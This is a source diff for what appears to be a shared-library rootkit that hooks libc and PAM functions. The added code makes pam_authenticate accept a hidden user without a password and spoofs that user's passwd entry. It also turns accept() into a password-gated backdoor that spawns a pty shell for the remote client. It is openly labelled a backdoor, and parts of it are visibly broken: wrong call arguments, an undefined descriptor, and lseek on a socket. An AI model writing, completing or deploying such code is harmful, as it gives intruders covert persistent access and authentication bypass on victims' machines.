@@ -18,26 +18,28 @@
 #include <security/pam_appl.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <sys/select.h>
+#include <sys/time.h>
 #include <unistd.h>
 #include <dlfcn.h>
 #include <stdlib.h>
 #include <stdbool.h>
 #include <pty.h>
 #include <utmp.h>    // login_tty() -- may not need later.
+#include <err.h>
 
 #include "h0h0.h"
 #include "config.h"
 #include "libcalls.h"
 
 /* Non-hooks: */
-void init(void)             __attribute__((hidden, constructor));
-void fini(void)             __attribute__((hidden, destructor));
-void drop_shell(int fd)     __attribute__((hidden));
-int watchdog(char *name);   __attribute((hidden));
+void init(void)             __attribute__((constructor, visibility("hidden")));
+void fini(void)             __attribute__((destructor, visibility("hidden")));
+void drop_shell(int fd)     __attribute__((visibility("hidden")));
+int watchdog(char *name)    __attribute__((visibility("hidden")));
 
 void init(void)
 {
-    int i;
     FILE *handle;
     char *caller = NULL;
     size_t len = 0;
@@ -63,58 +65,66 @@ void init(void)
 void fini(void)
 {
     // Cleanup.
-//    debug("fini() done.\n");
+    //debug("fini() done.\n");
 }
 
-void drop_shell(int fd)
+void drop_shell(int client)
 {
-    int master, slave;
-    pid_t pid;
-    char *argv[] = {SHELL_PATH, "-c", "echo 1234 > /tmp/hehe.txt", NULL};
-    char pty_name[13];    // /proc/sys/kernel/pty/max generally <= 4 chars.
-    char *test = "echo 123 > /tmp/456.txt\n";
+    debug("drop_shell()\n");
+    int master;
+    char *path = SHELL_PATH;
+    char *argv[] = { SHELL_PATH,  NULL }; 
+    char buf[BUFSIZ];
 
-    debug("drop_shell(): forkpty() called.\n");
-    pid = forkpty(&master, pty_name, NULL, NULL);
-
-    dprintf(fd, "Master FD: %d\n", master);
-    dprintf(fd, "Current FD: %d\n", fd);
-
-    if(pid == -1)
-        dprintf(fd, "fork() error.");
-    else if(pid == 0)
+    pid_t pid = forkpty(&master, NULL, NULL, NULL);
+    if (pid < 0)
     {
-        // dup2(master, STDOUT_FILENO);
-        // dup2(master, STDERR_FILENO);
-
-        debug("drop_shell(): dropping shell.\n");
-        execv(argv[0], argv);
-    }
-    else if(pid > 0)
-    {
-/*        if(write(master, test, strlen(test)) == -1)
-            dprintf(fd, "write() error.\n");
-        else
-            dprintf(fd, "write() okay.\n"); */
+        debug_err("fork()");
+        return;
     }
 
-/*    if(openpty(&master, &slave, pty_name, NULL, NULL) == 0)
+    /* Run shell in slave. */
+    if (pid == 0)
     {
-        if((pid = fork()) == 0)
-        {
-            if(login_tty(slave) == 0)
-                execv(argv[0], argv);
-        }
-        else if(pid > 0)
-        {
-            dup2(master, STDIN_FILENO);
-            dup2(master, STDOUT_FILENO);
-            dup2(master, STDERR_FILENO);
-        }
-    } */
+        execv(path, argv);
+    }
 
-    close(master);
-//    close(slave);
+    /* Handle IO in master. */
+    size_t num_read;
+    fd_set readfds;
+    while (true)
+    {
+        FD_ZERO(&readfds);
+        FD_SET(master, &readfds);
+        FD_SET(client, &readfds);
+
+        if (select(master + 1, &readfds, NULL, NULL, NULL) < 0)
+        {
+            debug_err("select()");
+            break;
+        }
+
+        /* Master --> Client. */
+        if (FD_ISSET(master, &readfds))
+        {
+            if((num_read = read(master, buf, BUFSIZ)) < 0)
+                debug_err("read(master)");
+            else
+                write(client, buf, num_read);
+        }
+        
+        /* Client --> Master. */
+        if (FD_ISSET(client, &readfds))
+        {
+            if((num_read = read(client, buf, BUFSIZ)) < 0)
+                debug_err("read(client)");
+            else
+                write(master, buf, num_read);
+        }
+
+
+        /* TODO: Exit when slave shell exits. */
+    }
 
     debug("drop_shell() done.\n");
 }
@@ -161,20 +171,22 @@ struct passwd *getpwnam(const char *name)
     libcall orig_getpwnam_r = getlibcall("getpwnam_r");
 
     char buf[1024];
-    struct passwd **result;
-    struct passwd *pwd = malloc(sizeof(struct passwd));
+    struct passwd *result;
+    static struct passwd pwd;
+
+    memset(&pwd, 0, sizeof(struct passwd));
 
     /* Bypass user existence check. */
     if (strcmp(SU_USER, name) == 0)
     {
         // Pretend JACK_USER is named SU_USER
-        orig_getpwnam_r(JACK_USER, pwd, buf, sizeof(buf), result);
-        pwd->pw_name = strdup(SU_USER);
+        orig_getpwnam_r(JACK_USER, &pwd, buf, sizeof(buf), &result);
+        pwd.pw_name = strdup(SU_USER);
     }
     else
-      orig_getpwnam_r(name, pwd, buf, sizeof(buf), result);
+      orig_getpwnam_r(name, &pwd, buf, sizeof(buf), &result);
 
-    return pwd;
+    return &pwd;
 }
 
 int pam_authenticate(pam_handle_t *pamh, int flags)
@@ -188,9 +200,7 @@ int pam_authenticate(pam_handle_t *pamh, int flags)
     if(strcmp(SU_USER, item) == 0)
         return PAM_SUCCESS;
 
-    int ret = orig_pam_authenticate(pamh, flags);
-    debug("pam_authenticate(): done\n");
-    return ret;
+    return orig_pam_authenticate(pamh, flags);
 }
 
 int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char *argv[])
@@ -198,9 +208,7 @@ int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char *arg
     debug("pam_sm_authenticate()\n");
     libcall orig_pam_sm_authenticate = getlibcall("pam_sm_authenticate");
 
-    int ret = orig_pam_sm_authenticate(pamh, flags, argc, argv);
-    debug("pam_sm_authenticate(): done\n");
-    return ret;
+    return orig_pam_sm_authenticate(pamh, flags, argc, argv);
 }
 
 int pam_open_session(pam_handle_t *pamh, int flags)
@@ -225,30 +233,45 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags)
     return orig_pam_acct_mgmt(pamh, flags);
 }
 
-/* accept() hook/backdoor */
+/* Network service hook/backdoor (WIP). */
 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 {
     debug("accept()\n");
+    targetfd = 0;
+
     libcall orig_accept = getlibcall("accept");
-    const size_t pass_len = strlen(SHELL_PASS);
-    char password[pass_len];
-    unsigned short int port;
-    int retfd;
+    
+    struct sockaddr_in host_addr;
+    size_t host_len = sizeof(addr);
+    unsigned short host_port;
+    int client_fd;
 
-    password[pass_len] = '\0';
+    /* Get host port number. */
+    getsockname(sockfd, &host_addr, &host_len);
+    host_port = ntohs(host_addr.sin_port);
 
-    retfd = orig_accept(sockfd, addr, addrlen);
-    port  = ntohs(((struct sockaddr_in *) addr)->sin_port);
-
-    if(port >= LOW_PORT && port <= HIGH_PORT)
+    client_fd = orig_accept(sockfd, addr, addrlen);
+    if (client_fd < 0)
     {
-        debug("accept(): ready for password: ");
-        read(retfd, password, pass_len);
-
-        if(strcmp(password, SHELL_PASS) == 0)
-            drop_shell(retfd);
+        debug_err("accept()");
+        return client_fd;
     }
 
-    debug("accept(): done\n");
-    return retfd;
+    if(host_port >= LOW_PORT && host_port <= HIGH_PORT)
+    {
+        size_t pass_len = strlen(SHELL_PASS);
+        char password[pass_len + 1];
+        password[pass_len] = '\0';
+
+        size_t num_read = orig_read(fd, password, pass_len);
+        
+        lseek(fd, -pass_len, SEEK_CUR); // Try to unread password
+
+        if (strcmp(SHELL_PASS, password) == 0)
+        {
+            drop_shell();
+        }
+    }
+
+    return client_fd;
 }
